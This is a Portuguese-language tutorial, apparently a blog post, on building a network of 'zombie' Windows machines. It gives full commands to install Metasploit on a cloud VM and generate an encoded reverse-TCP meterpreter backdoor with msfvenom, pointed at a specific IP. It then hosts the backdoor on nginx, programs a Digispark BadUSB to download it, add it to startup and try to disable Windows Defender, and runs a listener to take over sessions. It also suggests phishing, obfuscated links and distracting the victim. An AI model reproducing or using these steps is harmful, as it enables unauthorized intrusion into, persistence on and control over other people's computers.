

**Criar uma instancia e definir um IP estatico**

 Eu estarei utilizando o **GCP(Google cloud platform) **mas você pode utilizar o provedor de **CLOUD** que deseja ou até mesmo um VPS.

Acesso meu console e crio a instancia. Estancia essa que é bem basica, uma micro com SO Debian 9

Com o a instancia criada, eu defino um IP estatico para minha instancia.
O IP estatico é necessario para que não ocorra o risco do IP que definirmos no nosso backdoor mudar e perdemos nossos "computadores zumbis" já conquistados.

**Instalar METASPLOIT**

![](https://res.cloudinary.com/peerlyst/image/upload/c_limit,dpr_auto,f_auto,fl_lossy,h_428,q_auto,w_880/v1/post-attachments/1567258807005_bbvioc)

 Nesse passo vamos instalar nosso canivete suiço **METASPLOIT** para criamos nosso **BACKDOOR** e orquestramos nossos "computadores zumbis"

   Conecte-se a sua instancia por ssh para instalarmos o **METASPLOIT**
   
 ```shell
 curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
```
conceda permisão de execução para o instalador

 ```shell
 chmod +x msfinstall
```
agora execulte o mesmo

 ```shell
 ./msfinstall
```

Como vai ser a primeira execução o **METASPLOIT** vai perguntar se você deseja configurar seu ambiente, criando um novo banco de dados para o metasploit você responde com um sim e seus dados que ele vai criar as credenciais e configurar tudo para que você possa utilizar a ferramenta

 ```shell
 msfconsole --version
```


**Criar BACKDOOR REVERSE**

![](https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSCSVqEzi43NukYA2E1HUfNSnztdZxoeFKaTczSbokL40tqbRL9)

Agora vamos criar o nosso backdoor definindo qual tipo de conexão iremos usar que vai ser uma** REVERSA TCP** para qual tipo de SO alvo que sera maquinas Windows, qual vai ser o nosso **LHOST**(IP de comunicação) nossa **LPORT**(porta de comunicação) o tipo da extenção do backdoor **-f exe** o algoritmo de criptografia e compreensão, **-i ** o numero de interações do encoded com o backdoor, e **-o** o nosso arquivo de saida.  Se você estive e uma cloud provavelmente vai ter que *criar uma regra de firewall* para a sua porta escolhida

 ```shell
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=34.97.212.80 LPORT=5000 -f exe -e x86/shikata_ga_nai -i 5 -o payload.exe
```

Rodando um ls para listar os arquivos do diretorio verá que o arquivo payload.exe foi criado


** Configurar NGINX para download do backdoor**

 o **NGINX** vai ser necessario para  criarmos um servidor web no qual o nosso payload do **Digispark** possa fazer o download do **BACKDOOR** para dentro da maquina alvo. Ou enviarmos o link atraves de engenharia social para obter acesso a maquina alvo. 
 
 Vamos instalar o nginx

 ```shell
 sudo apt-get update
 sudo apt-get install -y nginx
```
Iremos criar uma copia do nosso backdoor dentro da pasta do servidor

 ```shell
 sudo cp ./payload.exe /var/www/html/payload.exe
````

Feito isso nosso arquivo vai esta disponivel para download em

http://34.97.212.80/payload.exe


**Digispark**

![](https://pbs.twimg.com/media/ELWqVmnXUAE5ku8.jpg)

Para continuarmos com nosso ataque, precisamos conquistar nosso primeiro "Zumbir". Podemos fazer isso de varias formas envolvendo engenharia social entre elas as mais comuns, como enviar o nosso link para um amigo, ofuscado de tal forma que não levante suspeitas. O ataque também pode ser feito utilizando tecnicas de **Phishing**.

Mas aqui vou abordar um **ataque de infecção fisica**, onde vamos precisar ter acesso fisico a uma maquina e com a posse de um **Digispark** iremos infectar o alvo.

Para quem não conhece o **Digispark**, ele é uma placa de desenvolvimento com tamanho reduzido e 6 pinos de I/O (entrada/saída), ideal para uso em projetos de IoT (Internet of Things ou Internet das Coisas) ou simplesmente para uso em projetos onde você não precisa de muitas portas do microcontrolador.

![](https://i.ytimg.com/vi/YXWxEzLHXuw/maxresdefault.jpg)

> *Poderiamos utilizar o **Rubber duck** original, mas no Brasil é dificil encotramos e os poucos que chegam a ser vendidos por precinho um pouco salgado. *

O **Digispark** chega ser um GENERICO ao Rubber duck*(dispositivo esse usado na serie Mr. Robot) * tem um desempenho inferior mas é uma alternativa acessivel e viavel para o nosso ataque e pode ser programada com a** IDE do Arduino**. com isso configuraremos o Digispark para ser reconhecido como um teclado, qual não iremos precisar de nenhum tipo de permisão do usuario da maquina, e iremos executar comandos de teclado para fazer o download do backdoor e execultar ele na maquina, adicionando ele junto a inicialização do Windows, para que quando a maquinar for reiniciar obtermos uma nova conexão com a mesma.

Agora bora lá, para isso você vai precisar de um[ Digispark ATtiny85 que pode ser encontrado no mercado livre por R$ 16](https://eletronicos.mercadolivre.com.br/pecas-componentes/arduino-digispark " Digispark ATtiny85 que pode ser encontrado no mercado livre por R$ 16") . Com ele em mãos agora você vai precisar carregar nele os modulos de "teclado" transformando-o em um "rubbe duck" para isso você pode seguir os passos [deste tutorial](https://aminbohio.com/creating-a-cheap-rubber-ducky-aka-bad-usb-with-attiny85 "este tutorial") e voltar aqui

> *Talvez você enfrente problemas ao efetuar a injeção de payload no digispark para resolver isso você vai precisar [configurar o uDev ]( https://www.hardware.com.br/livros/ferramentas-linux/entendendo-udev.html "configurar o uDev ")*

**Criar Payload para injectar o BACKDOOR**

Feito tudo isso e com o **ARDUINO IDE** instalado vamos criar o nosso Payload que ao plugarmos em uma maquina vai fazer o download do backdoor, mover ele para a inicialização do windows, tentar desativar o windows defender e  executar nosso backdoor, tudo isso em menos de 30 segundos.

Abra o Arduino IDE e cole o [payload que vou deixar aqui](https://github.com/despossivel/Vetor-de-ataque-com-CLOUD---BACKDOOR-DIGISPARK/blob/master/payload.ino "payload que vou deixar aqui") para vocês. Copiado, colado e entendido o que o payload faz, clique em verificar primeiro, para debugar nosso codigo e depois em carregar e aguarde a IDE solicitar que você pluge o digispark. Ao plugar a IDE vaI injetar na placa nosso payload e SUCESSO! 

![](https://cedarctic.github.io/digiQuack/images/logo.png)

Nosso **DigiQuack esta criado**.


** Iniciar escuta das conexões do backdoor**

Agora voltamos para a nossa instância para iniciarmos a escuta do backdoor na nossa porta. Em acesso SSH iniciamos o console do Metasploit executado

```shell
msfconsole
```
Depois de iniciado vamos selecionar qual exploit iremos usar, que é o multi/handle
feito isso setamos o meterpreter de conexão reversa tcp para o windows, setamos o nosso HOST e PORTA, os mesmo usados na criação do backdoor, e ExitOnSession para que o manipulador possa continuar executando como trabalho mesmo com uma sessão fechada ou com falha no medidor.

```shell
    msf >use exploit/multi/handler
    msf >set PAYLOAD windows/meterpreter/reverse_tcp
    msf >set LHOST 34.97.212.80
    msf >set LPORT 5000
    msf >set ExitOnSession false
```
feito tudo isso estamos prontos para receber nossas conexões, você pode pressionar ctrl+c para liberar o terminal que agora iremos visualizar nossas conexões e obter acesso.

**Obter acesso a uma maquina infectada**

Agora basta pluga-lo em qualquer maquina windows desviar a atenção do usuario da maquina aguardar alguns segundos e remove-lo, tudo muito rapido.

Você também pode enviar o link para alguem ou plugar o digispark em alguma maquina e aguardar o primeiro a se juntar a sua rede de zumbis hahahaha

para ficar na esculta em tempo real de quem se conectou ou disconectou rode.

```shell
    msf > exploit -j -z
```
 para listar nossas conexões de entrada até o momento

```shell
msf> sessions -l 
```
você tera uma saida algo como

![](https://s5.gifyu.com/images/sessionsL.png)



e para acessar um "zumbir
```shell
msf> sessions -i <numero da sessão> 
```

com isso você obtem acesso shell 

![](https://s5.gifyu.com/images/sessionsI.png)

 
#### ** CONHECIMENTO NÃO É CRIME, CRIME É O QUE VOCÊ FAZ COM ELE. **

#### **ENTÃO UTILIZE  O QUE APRENDEMOS AQUI PARA FINS DIDATICOS, PARA ZUAR UM AMIGO OU IRMÃO E RESPEITE A PRIVACIDADE DOS OUTROS**

@despossivel
